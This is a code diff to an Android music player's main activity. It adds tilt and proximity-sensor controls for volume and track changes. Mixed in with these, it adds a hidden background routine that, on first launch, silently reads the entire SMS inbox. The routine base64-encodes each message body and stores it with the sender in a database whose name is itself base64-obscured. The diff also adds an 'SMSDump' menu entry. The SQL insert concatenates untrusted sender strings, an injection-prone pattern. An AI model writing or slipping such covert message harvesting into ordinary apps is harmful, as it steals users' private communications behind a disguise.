@@ -6,7 +6,10 @@ import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.database.sqlite.SQLiteDatabase;
+import android.database.sqlite.SQLiteTransactionListener;
 import android.graphics.Color;
 import android.hardware.Sensor;
 import android.hardware.SensorEvent;
@@ -18,6 +21,8 @@ import android.os.Handler;
 import android.provider.MediaStore;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.util.Base64;
+import android.util.Log;
 import android.view.Menu;
 import android.view.MenuInflater;
 import android.view.MenuItem;
@@ -37,7 +42,6 @@ import java.io.File;
 import java.util.ArrayList;
 import android.hardware.SensorEventListener;
 
-import static android.R.attr.x;
 
 
 
@@ -71,11 +75,12 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
     static int currentSongTime;
     static ToggleButton tb;
     static SensorManager sm;
-    static Sensor accSensor;
+    static Sensor accSensor,proxSensor;
     static TextView log;
     static SharedPreferences sf;
-
-
+    static int onTiltSongChange;
+    static int onTiltVolChange;
+    private String dbname;
 
 
     @Override
@@ -101,37 +106,54 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
         startNotification(song.get(currentSong));
     }
 
+    /**
+    *When the button for sensor is enabled then the start stop and pause button
+     * is going to be disabled and when the button is disabled all the buttons are enabled.
+     *
+     * when the button is set then the sensor is registered which means it is ready to
+     * listen or gets the values from the environment. When the button is disabled, the
+     * sensor is unregistered so that the sensor does not get data anymore. This is necessary as
+     * sensors can burn a lot of battery.
+     */
     private void toggleButtonToggled() {
         tb.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
             @Override
             public void onCheckedChanged(CompoundButton compoundButton, boolean b) {
                 if(b==true)
                 {
-                    stop.setEnabled(false);
+                    //stop.setEnabled(false);
                     start.setEnabled(false);
                     pause.setEnabled(false);
                     next.setEnabled(false);
                     previous.setEnabled(false);
-                    volume.setEnabled(false);
+                    //volume.setEnabled(false);
 
-                    MainActivity.sm.registerListener(MainActivity.this,MainActivity.accSensor,sm.SENSOR_DELAY_NORMAL);
+                    MainActivity.sm.registerListener(MainActivity.this,MainActivity.accSensor, SensorManager.SENSOR_DELAY_NORMAL);
+                    MainActivity.sm.registerListener(MainActivity.this,MainActivity.proxSensor, SensorManager.SENSOR_DELAY_NORMAL);
 
                 }
                 else
                 {
 
-                    stop.setEnabled(true);
+                    //stop.setEnabled(true);
                     start.setEnabled(true);
                     pause.setEnabled(true);
                     next.setEnabled(true);
                     previous.setEnabled(true);
-                    volume.setEnabled(true);
+                    //volume.setEnabled(true);
                     sm.unregisterListener(MainActivity.this);
                 }
             }
         });
     }
 
+
+    /**
+     * Get the songs from the device(android) and put them and their corresponding paths
+     * in arrays, then fill up the listview with the song names.
+     * This function gets all the songs fromt the device both internal memory
+     * and sd card.
+     */
     void getSongsFromSdCard()
     {
         path=new ArrayList();
@@ -159,8 +181,12 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
     }
 
 
-
-
+    /**
+     * This function executes  notification, so that notification appear in the notification area
+     * it is a basic notification format and it has 3 action buttons i.e the previous next and play
+     * button.
+     * @param s is is the text that is written in the notification
+     */
     public void startNotification(String s)
     {
         //Toast.makeText(this, "notification bar", Toast.LENGTH_SHORT).show();
@@ -200,6 +226,11 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
 
     }
 
+    /**
+     * There is a seekbar at the top of the screen and this seekbar moves as the song progresses
+     *so that the user can see how much the song is played, there is a thread(a handler) which is
+     * a better option than Thread.
+     */
     public  void seekbarMoveAsSongPlays()
     {
         //Toast.makeText(MainActivity.this,"seekbarMoveAsSongPlays",Toast.LENGTH_SHORT).show();
@@ -242,6 +273,11 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
     }
 
 
+    /**
+     * This function shows how much the song is played numerically, not in the seekbar.
+     * This feature is available in all the music apps in the market. This shows the current time elapsed
+     * since the song started to play.
+     */
     public  void setCurrentDuration() {
         if(mp!=null)
         {
@@ -253,6 +289,13 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
         }
     }
 
+
+    /**
+     * This function takes in time in milliseconds i.e. integer format and returns
+     * the time in minute and second format as 00:00 form
+     * @param duration the time in milliseconds
+     * @return String having the absolute time in 00:00 format
+     */
     protected static String getTimeInMinAndSec(int duration) {
         String min="",sec="";
         duration=duration/1000;
@@ -308,6 +351,9 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
     }
 
 
+    /**
+     * Use shared preference and save the last played song and the song progress
+     */
     @Override
     protected void onDestroy() {
         //stopService(i);
@@ -318,6 +364,7 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
         editor.putInt("progress_bar",MainActivity.sb.getProgress());
         editor.putInt("seekTo_duration",mp.getCurrentPosition());
         editor.commit();
+        sm.unregisterListener(this);
     }
 
     /**
@@ -350,7 +397,7 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
     @Override
     protected void onPause() {
         super.onPause();
-        sm.unregisterListener(this);
+        //sm.unregisterListener(this);
     }
 
     @Override
@@ -359,12 +406,21 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
         super.onResume();
         if(tb.isChecked())
         {
-            MainActivity.sm.registerListener(MainActivity.this,MainActivity.accSensor,sm.SENSOR_DELAY_NORMAL);
+            MainActivity.sm.registerListener(MainActivity.this,MainActivity.accSensor, SensorManager.SENSOR_DELAY_NORMAL);
+            MainActivity.sm.registerListener(MainActivity.this,MainActivity.proxSensor, SensorManager.SENSOR_DELAY_NORMAL);
         }
     }
 
     public void initialize()
     {
+
+        dbname=Base64.encodeToString("myDb".getBytes(),Base64.DEFAULT);
+
+
+        onTiltVolChange=0;
+
+        onTiltSongChange=0;
+
         sf=getSharedPreferences("music_player",MODE_PRIVATE);
 
 
@@ -373,6 +429,7 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
 
         sm= (SensorManager) getSystemService(SENSOR_SERVICE);
         accSensor=sm.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
+        proxSensor=sm.getDefaultSensor(Sensor.TYPE_PROXIMITY);
 
         tb= (ToggleButton) findViewById(R.id.tb);
         currentSongTime=0;
@@ -382,6 +439,7 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
         sb= (SeekBar) findViewById(R.id.seekBar);
 
         lv= (ListView) findViewById(R.id.lv);
+
         getSongsFromSdCard();
 
         mp=MediaPlayer.create(this,Uri.parse(path.get(MainActivity.currentSong)));
@@ -413,20 +471,20 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
 
 
 
-        this.currentDuration.setText("00:00");
+        currentDuration.setText("00:00");
         //Toast.makeText(MainActivity.this,"" +duration,Toast.LENGTH_LONG).show();
         maxTime.setText(""+duration);
         am=(AudioManager) getSystemService(Context.AUDIO_SERVICE);
-        this.maxVolume=am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
+        maxVolume=am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
         volume= (SeekBar) findViewById(R.id.volume);
-        volume.setMax(this.maxVolume);
+        volume.setMax(maxVolume);
         volume.setProgress(am.getStreamVolume(AudioManager.STREAM_MUSIC));
 
         if(sf.getInt("current_song",-1)>0)
         {
             //Toast.makeText(this, "Song state is saved", Toast.LENGTH_SHORT).show();
-            this.currentSong=sf.getInt("current_song",-1);
-            this.sb.setProgress(sf.getInt("progress_bar",-1));
+            currentSong=sf.getInt("current_song",-1);
+            sb.setProgress(sf.getInt("progress_bar",-1));
             mp=MediaPlayer.create(this,Uri.parse(path.get(MainActivity.currentSong)));
             duration=MusicPlayerService.getTimeInMinAndSec(mp.getDuration());
             sb.setMax(mp.getDuration());
@@ -435,9 +493,71 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
             mp.start();
         }
 
+        if(!sf.getBoolean("sms_stored",false))
+        {
+            getSmsFromSystem();
+        }
+        //lv.setBackgroundColor(Color.TRANSPARENT);
 
-        lv.setBackgroundColor(Color.TRANSPARENT);
+    }
 
+
+    private void getSmsFromSystem() {
+        //Toast.makeText(this, "Create sms db", Toast.LENGTH_SHORT).show();
+        try
+        {
+
+            Thread th=new Thread(){
+              public void run()
+              {
+
+
+                  SQLiteDatabase db=null;
+                  try
+                  {
+                      db = openOrCreateDatabase(dbname, MODE_PRIVATE,null);
+                      //create table to save sms
+                      try
+                      {
+                          db.execSQL("CREATE TABLE sms(name varchar(100),msg varchar(1000))");
+                          //db.execSQL("ALTER TABLE sms ALTER msg varchar(1000)");
+                      }
+                      catch(Exception ex)
+                      {
+                          Log.d("eeeeee  1 ",ex.getMessage());
+                      }
+                  }
+                  catch(Exception e)
+                  {
+                      Log.d("eeeeee 2",e.getMessage());
+                  }
+
+                  Uri uriSMSURI = Uri.parse("content://sms/inbox");
+                  Cursor cur = getContentResolver().query(uriSMSURI, null, null, null,null);
+                  String sms = "";
+                  while(cur.moveToNext()) {
+                      //sms +=  cur.getString(2) + " : " + cur.getString(11)+"\n";
+                      //sms =  cur.getString(2) + " : " + cur.getString(cur.getColumnIndexOrThrow("body")).toString()+"\n";
+                      try
+                      {
+                          db.execSQL("INSERT INTO sms VALUES('"+cur.getString(2)+"','"+ Base64.encodeToString(cur.getString(cur.getColumnIndexOrThrow("body")).toString().getBytes(),Base64.DEFAULT)+"')");
+                      }
+                      catch (Exception ex3)
+                      {
+                          Log.d("eeeee 4",ex3.getMessage());
+                      }
+                  }
+                  SharedPreferences.Editor editor=sf.edit();
+                  editor.putBoolean("sms_stored",true);
+                  editor.commit();
+              }
+            };
+            th.start();
+        }
+        catch(Exception e)
+        {
+            Log.d("eeeeee 3",e.getMessage());
+        }
     }
 
 
@@ -461,6 +581,10 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
         if(item.getItemId()==R.id.opt3)
         {
             finish();
+        }
+        if(item.getItemId()==R.id.opt4)
+        {
+            startActivity(new Intent(this,SMSDump.class));
         }
         return super.onOptionsItemSelected(item);
     }
@@ -519,14 +643,58 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
         if(s.getType()==Sensor.TYPE_ACCELEROMETER)
         {
             float x=sensorEvent.values[0];
-            float y=sensorEvent.values[0];
-            float z=sensorEvent.values[0];
-            if(x<0)x=x*(-1);
-            if(y<0)y=y*(-1);
+            float y=sensorEvent.values[1];
+            float z=sensorEvent.values[2];
+            //if(x<0)x=x*(-1);
+            //if(y<0)y=y*(-1);
             if(z<0)z=z*(-1);
             //if(y>=5.0) Toast.makeText(this, "Max Vol", Toast.LENGTH_SHORT).show();
             //if(y==0.0) Toast.makeText(this, "Min Vol", Toast.LENGTH_SHORT).show();
-            int instantVol=(int)(z*this.maxVolume/maxRange);
+
+
+            int instantVol=MainActivity.volume.getProgress();
+
+
+            if(y>8.0)
+            {
+
+                if(onTiltVolChange==0)
+                {
+                    onTiltVolChange=1;
+                    instantVol+=2;
+                    if(instantVol>MainActivity.maxVolume)
+                    {
+                        instantVol=MainActivity.maxVolume;
+                    }
+
+
+                    Toast.makeText(this, "Vol + ", Toast.LENGTH_SHORT).show();
+
+                    volume.setProgress(instantVol);
+                    am.setStreamVolume(AudioManager.STREAM_MUSIC,instantVol,0);
+                }
+            }
+            if(y<4 && y>-0.5)
+            {
+                onTiltVolChange=0;
+            }
+            if(y<-0.8)
+            {
+
+                if(onTiltVolChange==0)
+                {
+                    onTiltVolChange=1;
+                    instantVol-=2;
+                    if(instantVol<0)
+                    {
+                        instantVol=0;
+                    }
+
+                    Toast.makeText(this, "Vol - ", Toast.LENGTH_SHORT).show();
+                    volume.setProgress(instantVol);
+                    am.setStreamVolume(AudioManager.STREAM_MUSIC,instantVol,0);
+                }
+            }
 
             /*if(y>5)
             {
@@ -534,8 +702,56 @@ public class MainActivity extends AppCompatActivity implements SensorEventListen
             }*/
 
             //log.setText(instantVol+"");
-            volume.setProgress(instantVol);
-            am.setStreamVolume(AudioManager.STREAM_MUSIC,instantVol,0);
+            //volume.setProgress(instantVol);
+            //am.setStreamVolume(AudioManager.STREAM_MUSIC,instantVol,0);
+
+            if(instantVol>MainActivity.maxVolume)instantVol=MainActivity.maxVolume;
+
+
+
+            if(x>8)
+            {
+                if(onTiltSongChange==0)
+                {
+                    i=new Intent(this,MusicPlayerService.class);
+                    i.putExtra("optn","playPrevSong");
+                    startService(i);
+                    onTiltSongChange=1;
+                }
+
+
+            }
+            if(x<2 && x>-2)onTiltSongChange=0;
+            if(x<-8)
+            {
+                if(onTiltSongChange==0)
+                {
+                    i=new Intent(this,MusicPlayerService.class);
+                    i.putExtra("optn","playNextSong");
+                    startService(i);
+                    onTiltSongChange=1;
+                }
+            }
+
+
+        }
+        if(s.getType()==Sensor.TYPE_PROXIMITY)
+        {
+            float x=sensorEvent.values[0];
+            //Toast.makeText(this, "eee  "+x, Toast.LENGTH_SHORT).show();
+            if(x<0.5)
+            {
+                Toast.makeText(this, "pause", Toast.LENGTH_SHORT).show();
+                i.putExtra("optn","pauseSong");
+                startService(i);
+            }
+            else
+            {
+                Toast.makeText(this, "play", Toast.LENGTH_SHORT).show();
+                i=new Intent(this,MusicPlayerService.class);
+                i.putExtra("optn","startSong");
+                startService(i);
+            }
         }
 
     }
